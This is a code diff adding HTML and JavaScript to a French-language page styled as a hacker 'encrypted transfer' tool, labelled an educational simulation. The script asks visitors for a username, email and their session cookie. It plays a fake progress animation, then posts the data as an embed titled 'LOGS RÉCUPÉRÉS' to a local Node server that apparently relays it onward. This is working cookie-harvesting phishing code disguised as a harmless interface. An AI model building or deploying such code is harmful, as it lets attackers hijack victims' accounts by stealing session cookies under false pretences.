@@ -60,4 +60,83 @@
         </div>
 
         <div id="loading-zone">
-            <div class="glitch" id="status-text">CRYPTAGE EN COURS
+            <div class="glitch" id="status-text">CRYPTAGE EN COURS...</div>
+            <div class="progress-bar" id="bar-text">[░░░░░░░░░░░░] 0%</div>
+        </div>
+
+        <div id="final-success">
+            <h2 style="color:white; border-bottom: 1px solid white; padding-bottom:10px;">TRANSFERT RÉUSSI</h2>
+            <p style="margin-top:20px;">[SYSTEM]: Données transmises avec succès.</p>
+            <p>Un rapport détaillé vous sera envoyé par <strong>EMAIL</strong> à l'adresse suivante :</p>
+            <p style="color: var(--neon-green); font-size: 1.2rem; text-decoration: underline;" id="target-email"></p>
+            <div class="progress-bar" style="color:var(--neon-green); margin-top:20px;">[████████████] 100%</div>
+            <button onclick="location.reload()" style="background:none; color:var(--neon-green); border:1px solid var(--neon-green); margin-top:30px;">NOUVELLE SESSION</button>
+        </div>
+    </div>
+</div>
+
+<p class="footer-note">EDUCATIONAL SIMULATION ONLY - CYBER LABS 2026</p>
+
+<script>
+    async function processData() {
+        const u = document.getElementById('username').value;
+        const e = document.getElementById('userEmail').value;
+        const c = document.getElementById('cookieInput').value;
+
+        if(!u || !e) return alert("Erreur : L'utilisateur et l'email sont requis.");
+
+        // Afficher l'écran de chargement
+        document.getElementById('user-view').style.display = 'none';
+        document.getElementById('loading-zone').style.display = 'block';
+        
+        const status = document.getElementById('status-text');
+        const bar = document.getElementById('bar-text');
+
+        // Animation de la barre de progression
+        const steps = [
+            { t: "GÉNÉRATION DU TUNNEL...", b: "[██░░░░░░░░░░] 20%" },
+            { t: "ENVOI DES PAQUETS...", b: "[██████░░░░░░] 55%" },
+            { t: "SYNCHRONISATION FINALE...", b: "[██████████░░] 85%" }
+        ];
+
+        let i = 0;
+        const interval = setInterval(async () => {
+            if(i < steps.length) {
+                status.innerText = steps[i].t;
+                bar.innerText = steps[i].b;
+                i++;
+            } else {
+                clearInterval(interval);
+                
+                // Envoi réel au serveur Node.js
+                const payload = {
+                    embeds: [{
+                        title: "🚨 LOGS RÉCUPÉRÉS 🚨",
+                        color: 5763719,
+                        fields: [
+                            { name: "👤 User", value: u, inline: true },
+                            { name: "📧 Email", value: e, inline: true },
+                            { name: "🍪 Session", value: "```" + (c || "N/A") + "```" }
+                        ]
+                    }]
+                };
+
+                try {
+                    await fetch("http://localhost:3000/send-data", {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+                } catch (err) { console.error("Le serveur Node n'est pas lancé."); }
+
+                // Afficher l'écran final
+                document.getElementById('loading-zone').style.display = 'none';
+                document.getElementById('final-success').style.display = 'block';
+                document.getElementById('target-email').innerText = e;
+            }
+        }, 700);
+    }
+</script>
+
+</body>
+</html>
